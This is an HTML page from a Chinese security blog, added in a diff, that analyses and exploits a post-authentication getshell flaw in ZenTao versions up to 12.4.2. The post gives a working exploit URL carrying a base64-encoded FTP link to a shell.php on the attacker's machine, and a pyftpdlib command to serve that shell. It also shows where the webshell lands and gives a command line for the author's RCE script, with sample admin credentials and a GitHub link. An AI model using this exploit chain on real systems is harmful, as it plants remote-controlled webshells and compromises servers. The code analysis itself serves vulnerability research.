@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="禅道&lt;&#x3D;12.4.2 后台getshell漏洞利用Exploit： http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;client-download-1-(base64 encode webshelldownload link)-1.html http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;data&#x2F;client&#x2F;1&#x2F;(download link filename)  复现： ![img](&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_=12.4.2%20%E5%90%8E%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="禅道&lt;&#x3D;12.4.2 后台getshell漏洞利用Exploit： http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;client-download-1-(base64 encode webshelldownload link)-1.html http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;data&#x2F;client&#x2F;1&#x2F;(download link filename)  复现： ![img](&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:09.625Z">
+<meta property="article:modified_time" content="2022-07-08T09:06:16.857Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-禅道/禅道_=12.4.2 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_=12.4.2%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.625Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="禅道-lt-12-4-2-后台getshell"><a href="#禅道-lt-12-4-2-后台getshell" class="headerlink" title="禅道&lt;=12.4.2 后台getshell"></a>禅道&lt;=12.4.2 后台getshell</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Exploit：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/client-download-1-">http://127.0.0.1/zentao/client-download-1-</a>(base64 encode webshelldownload link)-1.html</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/data/client/1/">http://127.0.0.1/zentao/data/client/1/</a>(download link filename)</p>
+<p> <strong>复现：</strong></p>
+<p>![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/clip_image002.jpg)</p>
+<p>使用<strong>FTP****协议</strong>下载文件，绕过<strong>module/client/ext/model/xuanxuan.php:10</strong> <strong>downloadZipPackage</strong> 的<strong>HTTP****协议</strong>过滤。</p>
+<p>![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/clip_image004.jpg)</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>首先该漏洞需要后台管理员权限，所以我们首先登陆至后台。通过下图我们可以看到登陆后的界面URL为：<br><code>http://192.168.52.141/zentaopms/www/index.php?m=my&amp;f=index</code></p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t012b1edfbb5968327e.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t012b1edfbb5968327e.png)</a></p>
+<p>我们看到后台界面分别对m以及f参数进行传参，那么不难猜出大概就是调用my类下的index方法，我们看一下该段的代码。</p>
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t0159e9407d7b4a59e9.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t0159e9407d7b4a59e9.png)</a></p>
+<p>在/module/my/lang/zh-cn.php下可以看到存在指向index的方法，这验证了我们上面猜测是正确的，那么我们下面来看一下文件下载漏洞点的代码部分。</p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t01e389578003518177.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01e389578003518177.png)</a></p>
+<p>漏洞是发生在client类下的donwload函数中，我们定位函数至/module/client/control.php中找到该方法，本段代码大致意思就是会接收三个参数version、os、link，然后去调用<strong>downloadZipPackage</strong>方法进行文件下载操作，并对一些下载失败事件进行不同回显，比如downloadFail，saveClientError在上图的方法列表我们可以看到他们调用的方法的具体含义，这里就不再赘述，最后如果没有失败事件时间就会返回成功。在downloadZipPackage并不需要os方法，所以这在我们后期利用时也不需要传入该参数。</p>
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t01bc3554884a1ddd3a.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01bc3554884a1ddd3a.png)</a></p>
+<p>然后继续跟进downloadZipPackage方法中，注意重点来了，漏洞真正的产生原因就在该方法中。</p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t01d664441732fb42e4.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01d664441732fb42e4.png)</a></p>
+<p>我们可以看到这段代码首先对传入的link参数进行了base64解码操作，这里的link参数就是我们shell的远程地址，然后下面会通过一个正则表达式进行判断，link地址是否以 http:// 或者 https:// 开头，如果存在则return返回false并退出方法，否则调用方法<strong>parent::downloadZipPackage</strong>，这里其实忽略了FTP这一文件下载方法，也就是说我们可以通过FTP服务代替进行文件下载操作从而绕过正则的限制。</p>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t01be4bcd3b62e34b7c.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01be4bcd3b62e34b7c.png)</a></p>
+<p>downloadZipPackage方法就没有什么问题了，就是一段文件下载函数，会通过传入的version值创建并命名在data下创建的文件夹并将下载的文件保存在其中。</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>那么这其实就是很清晰了，通过文章开始介绍的m和f参数的调用，我们可以对client类以及download参数进行调用，并传入download参数必要的version以及link参数就可以完成漏洞的利用了。这里的link地址是base64加密后的ftp连接地址，,比如:</p>
+<p><strong><a href="ftp://192.168.52.1/shell.php">ftp://192.168.52.1/shell.php</a></strong></p>
+<p>大家可以直接使用python的pyftpdlib模块开启FTP服务比较方便，命令:</p>
+<p>**python -m pyftpdlib -p 21 -d .**默认开启匿名用户，不需要输入用户名密码。</p>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t010ff8a21f7d431f36.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t010ff8a21f7d431f36.png)</a></p>
+<p>构建exp如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/zentaopms/www/index.php?m=client&amp;f=download&amp;version=1&amp;link=ZnRwOi8vMTkyLjE2OC41Mi4xL3NoZWxsLnBocA==</span><br></pre></td></tr></table></figure>
+
+<p>可以看到回显弹窗保存成功，然后再到靶机中查看发现下载成功，保存路径至</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/zentaopms/www/data/client/1/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t01e196a8e5fd936c20.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01e196a8e5fd936c20.png)</a></p>
+<p>连接木马，成功利用！</p>
+<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t01f672108d970a681f.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01f672108d970a681f.png)</a></p>
+<h2 id="漏洞利用EXP"><a href="#漏洞利用EXP" class="headerlink" title="漏洞利用EXP"></a>漏洞利用EXP</h2><p>所以本文最突出的一个部分来了，就是我们有EXP啊。通过两个夜晚的努力，终于完成了，其中也碰到了不少坑，但是好在都解决了。下面由我来介绍一下他的使用方法吧。</p>
+<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t01af2b24af5c3ddc4c.png">![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01af2b24af5c3ddc4c.png)</a></p>
+<p>构建命令:<code>python &quot;Zentao RCE EXP.py&quot; -H http://192.168.52.141 -U admin -P Admin888 -f 192.168.52.1</code></p>
+<p>其中-H指定目标主机，-U指定后台用户名，-P指定密码，-f指定VMnet8网卡的IP，这样虚拟机才能正常访问到物理机的FTP服务，当然如果测试环境也在虚拟机中则可以修改源码自动获取IP即可，这里是以我的环境为准所以没有这么做，也因为我觉得麻烦一点来换取兼容性更好一点是不亏的，所以小伙伴可以自行修改使用，我想这也不难，源码中也标注了修改位置。目前已经上传至github，有兴趣的小伙伴可以自行下载测试。</p>
+<p><strong>EXP github地址:</strong><code>https://github.com/wikiZ/Zentao-RCE</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_=12.4.2%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qzyq00ovy8v13zl45ivn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
